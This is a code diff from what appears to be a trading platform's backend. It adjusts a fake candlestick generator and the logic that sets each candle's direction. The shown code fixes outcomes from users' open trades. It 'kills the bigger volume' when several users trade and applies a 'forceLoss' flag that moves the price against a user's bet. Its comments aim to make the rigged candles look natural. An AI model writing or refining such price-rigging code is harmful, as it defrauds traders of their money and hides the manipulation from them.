@@ -80,46 +80,47 @@ function generateHistoricalCandle(timestamp, open, isLive = false) {
     const baseVol = safeOpen * 0.00008;
 
     // Dynamic Volatility Multiplier to make it look completely natural
-    const dynamicVol = baseVol * (0.3 + Math.random() * 2.2);
+    const dynamicVol = baseVol * (0.5 + Math.random() * 2.0);
 
     let bodySize, upperWick, lowerWick;
     const rand = Math.random();
 
-    if (rand < 0.07) {
-        // 7% Chance: Doji (Tiny body, medium/large wicks)
-        bodySize = dynamicVol * (Math.random() * 0.15);
-        upperWick = dynamicVol * (0.4 + Math.random() * 1.0);
-        lowerWick = dynamicVol * (0.4 + Math.random() * 1.0);
+    if (rand < 0.05) {
+        // 5% Chance: Doji (Tiny body, medium/large wicks)
+        bodySize = dynamicVol * (Math.random() * 0.1);
+        upperWick = dynamicVol * (0.3 + Math.random() * 1.2);
+        lowerWick = dynamicVol * (0.3 + Math.random() * 1.2);
     }
-    else if (rand < 0.17) {
+    else if (rand < 0.15) {
         // 10% Chance: Hammer / Shooting Star (Small body, one massive wick)
-        bodySize = dynamicVol * (0.2 + Math.random() * 0.4);
+        bodySize = dynamicVol * (0.1 + Math.random() * 0.4);
         if (Math.random() > 0.5) {
-            upperWick = dynamicVol * (1.5 + Math.random() * 2.0);
+            upperWick = dynamicVol * (1.0 + Math.random() * 2.0);
             lowerWick = dynamicVol * (Math.random() * 0.2);
         } else {
             upperWick = dynamicVol * (Math.random() * 0.2);
-            lowerWick = dynamicVol * (1.5 + Math.random() * 2.0);
+            lowerWick = dynamicVol * (1.0 + Math.random() * 2.0);
         }
     }
-    else if (rand < 0.22) {
+    else if (rand < 0.20) {
         // 5% Chance: Big Marubozu Trend (Massive body, almost no wick)
-        bodySize = dynamicVol * (1.5 + Math.random() * 1.0);
+        bodySize = dynamicVol * (1.5 + Math.random() * 1.5);
         upperWick = dynamicVol * (Math.random() * 0.1);
         lowerWick = dynamicVol * (Math.random() * 0.1);
     }
-    else if (rand < 0.235) {
-        // 1.5% Chance: Huge Breakout (Massive candle, 5x to 10x normal size)
-        const multiplier = 5.0 + Math.random() * 3.0;
+    else if (rand < 0.22) {
+        // 2% Chance: Huge Breakout (Massive candle, 4x to 8x normal size)
+        const multiplier = 4.0 + Math.random() * 4.0;
         bodySize = dynamicVol * multiplier;
         upperWick = dynamicVol * (Math.random() * 0.4);
         lowerWick = dynamicVol * (Math.random() * 0.4);
     }
     else {
-        // ~76.5% Chance: Standard Natural Candle (Medium body, moderate wicks)
-        bodySize = dynamicVol * (0.5 + Math.random() * 1.0);
-        upperWick = dynamicVol * (0.15 + Math.random() * 0.6);
-        lowerWick = dynamicVol * (0.15 + Math.random() * 0.6);
+        // ~78% Chance: Purely Random Natural Candle
+        // Completely dynamic bodies and wicks for realistic non-repeating looks
+        bodySize = dynamicVol * (0.2 + Math.random() * 1.2);
+        upperWick = dynamicVol * (0.1 + Math.random() * 1.0);
+        lowerWick = dynamicVol * (0.1 + Math.random() * 1.0);
     }
 
     const close = isGreen ? safeOpen + bodySize : safeOpen - bodySize;
@@ -381,7 +382,7 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
 
             if (uniqueUsers.size === 0) {
                 // No trades expiring now -> Natural Random
-                targetDirection = Math.random() > 0.5 ? 'GREEN' : 'RED';
+                targetDirection = 'NATURAL';
             }
             else if (uniqueUsers.size > 1) {
                 // Multi-User -> Volume Edge (Kill the bigger volume)
@@ -473,9 +474,11 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
                 targetDirection = forceLoss ? (userPrimaryDirection === 'UP' ? 'RED' : 'GREEN') : (userPrimaryDirection === 'UP' ? 'GREEN' : 'RED');
             }
 
-            newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
-            newCandle.isAdminCommand = false;
-            newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00003);
+            if (targetDirection !== 'NATURAL') {
+                newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
+                newCandle.isAdminCommand = false;
+                newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00003);
+            }
         }
 
         if (!newCandle) {
